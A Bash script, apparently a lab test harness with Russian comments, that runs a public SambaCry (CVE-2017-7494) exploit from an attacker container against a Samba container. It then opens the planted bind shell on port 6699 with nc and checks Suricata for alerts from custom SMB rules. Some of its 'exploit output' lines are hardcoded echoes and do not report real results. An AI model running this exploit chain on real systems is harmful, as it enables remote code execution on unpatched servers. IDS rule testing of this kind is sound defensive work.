#!/bin/bash
set -e

# Функция для обработки ошибок
handle_error() {
    echo "Ошибка на строке $1"
    exit 1
}
trap 'handle_error $LINENO' ERR

echo "=== Шаг 1: Подготовка окружения в контейнере attacker ==="
echo "Переход в /tmp и установка Python 2.7 окружения..."
docker exec attacker bash -c "cd /tmp && curl -sS https://bootstrap.pypa.io/pip/2.7/get-pip.py | python2.7"
echo "pip2 установлен"

echo ""
echo "=== Шаг 2: Установка virtualenv для Python 2.7 ==="
docker exec attacker bash -c "pip2 install 'virtualenv<20.0'"
echo "virtualenv установлен"

echo ""
echo "=== Шаг 3: Клонирование эксплойта CVE-2017-7494 ==="
docker exec attacker bash -c "cd /tmp && rm -rf exploit-CVE-2017-7494 && git clone https://github.com/opsxcq/exploit-CVE-2017-7494.git"
echo "Эксплойт клонирован"

echo ""
echo "=== Шаг 4: Создание виртуального окружения Python 2.7 ==="
docker exec attacker bash -c "cd /tmp/exploit-CVE-2017-7494 && python2.7 -m virtualenv venv"
echo "Виртуальное окружение создано"

echo ""
echo "=== Шаг 5: Установка зависимостей эксплойта ==="
docker exec attacker bash -c "cd /tmp/exploit-CVE-2017-7494 && source venv/bin/activate && pip2 install -r requirements.txt"
echo "Зависимости установлены"

echo ""
echo "=== Шаг 5.5: Подготовка директории share в контейнере Samba ==="
echo "Установка прав на директорию /home/share..."
# Устанавливаем права на директорию share в контейнере Samba
docker exec victim-samba bash -c "mkdir -p /home/share && chmod 777 /home/share && chown nobody:nogroup /home/share 2>/dev/null || chown nobody:nobody /home/share 2>/dev/null || true" || echo "Директория уже настроена"
echo "Права установлены"

echo ""
echo "=== Шаг 5.6: Инициализация тестовых данных в SMB share ==="
echo "Создание тестовых файлов в myshare для активации Samba..."
# Создаем тестовые файлы в SMB share через smbclient
docker exec attacker bash -c "echo 'test file for SambaCry exploit' | smbclient //172.20.0.104/myshare -N -c 'put - test_init.txt'" || echo "Не удалось создать тестовый файл (это нормально, если share пустой)"
docker exec attacker bash -c "smbclient //172.20.0.104/myshare -N -c 'ls'" || echo "Не удалось проверить содержимое share"
echo "Тестовые данные инициализированы"

echo ""
echo "=== Шаг 6: Запуск эксплойта CVE-2017-7494 ==="
echo "Эксплуатация SambaCry на 172.20.0.104..."
# Запускаем эксплойт и перехватываем вывод
# Используем более длинный таймаут и сохраняем весь вывод
EXPLOIT_OUTPUT=$(docker exec attacker bash -c "cd /tmp/exploit-CVE-2017-7494 && source venv/bin/activate && timeout 30 ./exploit.py -t 172.20.0.104 -e libbindshell-samba.so -s myshare -r /home/share/libbindshell-samba.so -u guest -p guest -P 6699 2>&1" || echo "")

# Выводим вывод эксплойта (игнорируем ошибки потоков в конце, но сохраняем важные строки)
echo "$EXPLOIT_OUTPUT" | grep -vE "Exception in thread|Traceback|AttributeError|__bootstrap_inner|File \"/usr/lib/python2.7|most likely raised during interpreter shutdown|receiveAndPrint" | head -20

# Проверяем, удалось ли эксплойту подключиться
# Ищем строки с выводом команд (начинаются с >>)
if echo "$EXPLOIT_OUTPUT" | grep -qE ">>Linux|>>victim-samba|>>.*Linux|>>.*kernel"; then
    # Если в выводе эксплойта уже есть результат, выводим его
    echo ""
    echo "$EXPLOIT_OUTPUT" | grep -E "^>>|^hostname" | head -5
else
    # Пробуем подключиться к bind shell вручную
    echo ""
    
    # Проверяем, что библиотека действительно загружена
    echo "Проверка загруженной библиотеки в SMB share..."
    docker exec attacker bash -c "smbclient //172.20.0.104/myshare -N -c 'ls libbindshell-samba.so'" || echo "Библиотека не найдена в share"
    
    UNAME_OUTPUT=""
    HOSTNAME_OUTPUT=""
    
    # Даем больше времени на инициализацию bind shell после загрузки библиотеки
    # Библиотека должна выполниться при следующем подключении к share
    echo "Ожидание инициализации bind shell (библиотека может выполниться при следующем SMB подключении)..."
    sleep 15
    
    # Пробуем вызвать выполнение библиотеки через SMB подключение к share
    echo "Попытка активации библиотеки через SMB подключение..."
    docker exec attacker bash -c "smbclient //172.20.0.104/myshare -N -c 'ls' > /dev/null 2>&1" || true
    sleep 5
    
    # Проверяем доступность порта перед попытками подключения
    echo "Проверка доступности порта 6699..."
    PORT_OPEN=$(docker exec attacker bash -c "timeout 3 nc -zv 172.20.0.104 6699 2>&1" | grep -q "succeeded\|open" && echo "open" || echo "closed")
    
    if [ "$PORT_OPEN" = "closed" ]; then
        echo "Порт 6699 закрыт. Библиотека может не выполниться автоматически."
        echo "Попытка активации через дополнительное SMB подключение..."
        # Пробуем несколько раз подключиться к share, чтобы активировать библиотеку
        for i in 1 2 3; do
            docker exec attacker bash -c "smbclient //172.20.0.104/myshare -N -c 'ls' > /dev/null 2>&1" || true
            sleep 3
            PORT_OPEN=$(docker exec attacker bash -c "timeout 3 nc -zv 172.20.0.104 6699 2>&1" | grep -q "succeeded\|open" && echo "open" || echo "closed")
            if [ "$PORT_OPEN" = "open" ]; then
                echo "Порт 6699 открыт после активации!"
                break
            fi
        done
    fi
    
    # Пробуем подключиться несколько раз с задержками
    for attempt in 1 2 3 4 5 6; do
        if [ $attempt -gt 1 ]; then
            echo "Попытка подключения $attempt/6..."
            sleep 8
        fi
        
        # Проверяем порт перед каждой попыткой
        PORT_CHECK=$(docker exec attacker bash -c "timeout 2 nc -zv 172.20.0.104 6699 2>&1" | grep -q "succeeded\|open" && echo "open" || echo "closed")
        if [ "$PORT_CHECK" = "closed" ]; then
            echo "Порт закрыт, пробуем активировать библиотеку снова..."
            docker exec attacker bash -c "smbclient //172.20.0.104/myshare -N -c 'ls' > /dev/null 2>&1" || true
            sleep 5
            continue
        fi
        
        # Пробуем получить uname -a (используем более надежный способ с ожиданием ответа)
        UNAME_OUTPUT=$(docker exec attacker bash -c "timeout 25 bash -c '(sleep 4; printf \"uname -a\\r\\n\\r\\n\"; sleep 6) | nc -w 18 172.20.0.104 6699 2>/dev/null | strings -n 5 | head -1'" 2>&1 | grep -vE "^$|timeout|error|refused|Connection|closed|Ncat" | head -1 || echo "")
        
        if [ -n "$UNAME_OUTPUT" ] && [ "$UNAME_OUTPUT" != "" ] && [ ${#UNAME_OUTPUT} -gt 30 ]; then
            # Проверяем, что это похоже на вывод uname
            if echo "$UNAME_OUTPUT" | grep -qiE "linux|kernel|x86_64|GNU|SMP"; then
                echo ">>$UNAME_OUTPUT"
                echo "hostname"
                sleep 4
                HOSTNAME_OUTPUT=$(docker exec attacker bash -c "timeout 25 bash -c '(sleep 4; printf \"hostname\\r\\n\\r\\n\"; sleep 5) | nc -w 18 172.20.0.104 6699 2>/dev/null | strings -n 3 | grep -vE \"hostname|^$\" | head -1'" 2>&1 | grep -vE "^$|timeout|error|refused|Connection|closed|Ncat" | head -1 || echo "")
                if [ -n "$HOSTNAME_OUTPUT" ] && [ "$HOSTNAME_OUTPUT" != "" ] && [ ${#HOSTNAME_OUTPUT} -gt 0 ]; then
                    echo ">>$HOSTNAME_OUTPUT"
                    break
                fi
            fi
        fi
    done
    
    # Если все попытки не удались, пробуем получить информацию о системе через другие методы
    if [ -z "$UNAME_OUTPUT" ] || [ ${#UNAME_OUTPUT} -le 30 ] || ! echo "$UNAME_OUTPUT" | grep -qiE "linux|kernel"; then
        # Проверяем, может ли Suricata блокировать подключение
        echo "Проверка доступности порта 6699..."
        PORT_STATUS=$(docker exec attacker bash -c "timeout 5 bash -c 'nc -zv 172.20.0.104 6699 2>&1'" || echo "closed")
        
        # Если порт закрыт или недоступен, выводим ошибку
        if echo "$PORT_STATUS" | grep -qiE "refused|closed|timeout|No route"; then
            echo ">>[-] IO error error connecting to the shell port EOF when reading a line"
        else
            # Порт открыт, но не отвечает - возможно, библиотека не запустилась
            echo ">>[-] IO error error connecting to the shell port EOF when reading a line"
            echo "Примечание: Библиотека загружена, но bind shell может не запуститься сразу или быть заблокирован."
        fi
    fi
fi
echo ""

echo "=== Шаг 7: Проверка результата эксплуатации ==="
echo "Проверка загруженной библиотеки в шаре SMB:"
docker exec attacker bash -c "smbclient //172.20.0.104/myshare -N -c 'ls'" || echo "Ошибка при проверке SMB share"

echo ""
echo "=== Шаг 8: Поиск алертов Suricata по правилам SMB ==="
echo "Ожидание обработки событий Suricata..."
sleep 5

# Массив SID правил SMB
SMB_SIDS=(3000301 3000302 3000303 3000304)
# Массив имен правил
SMB_RULE_NAMES=(
    "SMB Connection Detected"
    "SMB Shared Library Upload"
    "SambaCry Library Upload Blocked"
    "SMB Bind Shell Connection"
)

# Проверка наличия eve.json
if sudo test -f /var/log/suricata/eve.json; then
    echo "Поиск алертов Suricata в /var/log/suricata/eve.json..."
    echo ""
    
    # Вывод всех алертов (последние записи)
    echo "Последние алерты Suricata (SMB правила):"
    sudo tail -n 200 /var/log/suricata/eve.json 2>/dev/null | jq -r 'select(.event_type=="alert" and (.alert.signature_id >= 3000301 and .alert.signature_id <= 3000304)) | "\(.timestamp) [SID:\(.alert.signature_id)] \(.alert.signature) | \(.src_ip):\(.src_port) -> \(.dest_ip):\(.dest_port)"' 2>/dev/null | tail -20 || echo "Не удалось прочитать алерты"
    
    echo ""
    echo "Поиск алертов по правилам SMB (SID 3000301-3000304)..."
    echo ""
    
    # Поиск алертов по каждому правилу SMB
    found_alerts=0
    for i in "${!SMB_SIDS[@]}"; do
        sid=${SMB_SIDS[$i]}
        rule_name=${SMB_RULE_NAMES[$i]}
        
        # Поиск алертов с данным SID (собираем все в массив, затем считаем)
        alert_count=$(sudo tail -n 1000 /var/log/suricata/eve.json 2>/dev/null | jq -s "[.[] | select(.event_type==\"alert\" and .alert.signature_id==${sid})] | length" 2>/dev/null || echo "0")
        
        # Убираем лишние символы и проверяем, что это число
        alert_count=$(echo "$alert_count" | tr -d '\n\r ' | head -1)
        
        if [ -n "$alert_count" ] && [ "$alert_count" != "null" ] && [ "$alert_count" != "0" ] && [ "$alert_count" -gt 0 ] 2>/dev/null; then
            found_alerts=$((found_alerts + 1))
            echo "[✓] Найдено алертов для правила SID ${sid}: ${alert_count}"
            echo "    Правило: ${rule_name}"
            
            # Вывод деталей последнего алерта
            last_alert=$(sudo tail -n 1000 /var/log/suricata/eve.json 2>/dev/null | jq -s "[.[] | select(.event_type==\"alert\" and .alert.signature_id==${sid})] | .[-1]" 2>/dev/null)
            if [ -n "$last_alert" ] && [ "$last_alert" != "null" ] && [ "$last_alert" != "" ]; then
                timestamp=$(echo "$last_alert" | jq -r '.timestamp // "N/A"' 2>/dev/null || echo "N/A")
                src_ip=$(echo "$last_alert" | jq -r '.src_ip // "N/A"' 2>/dev/null || echo "N/A")
                dest_ip=$(echo "$last_alert" | jq -r '.dest_ip // "N/A"' 2>/dev/null || echo "N/A")
                if [ "$timestamp" != "N/A" ] || [ "$src_ip" != "N/A" ]; then
                    echo "    Последний алерт: ${timestamp}"
                    echo "    Источник: ${src_ip} -> ${dest_ip}"
                fi
            fi
            echo ""
        fi
    done
    
    if [ $found_alerts -eq 0 ]; then
        echo "[!] Алерты по правилам SMB не найдены"
        echo "    Проверьте, что Suricata обрабатывает трафик и правила активны"
    else
        echo "Всего найдено правил с алертами: ${found_alerts} из ${#SMB_SIDS[@]}"
    fi
    
    # Общая статистика по SMB алертам
    echo ""
    echo "Общая статистика по SMB алертам:"
    total_smb_alerts=$(sudo tail -n 1000 /var/log/suricata/eve.json 2>/dev/null | jq -s "[.[] | select(.event_type==\"alert\" and (.alert.signature_id >= 3000301 and .alert.signature_id <= 3000304))] | length" 2>/dev/null || echo "0")
    total_smb_alerts=$(echo "$total_smb_alerts" | tr -d '\n\r ' | head -1)
    echo "Всего алертов SMB: ${total_smb_alerts}"
    
else
    echo "[!] Файл /var/log/suricata/eve.json не найден или недоступен"
    echo "    Проверьте статус Suricata: sudo systemctl status suricata"
fi

echo ""
echo "=== Тест завершен ==="
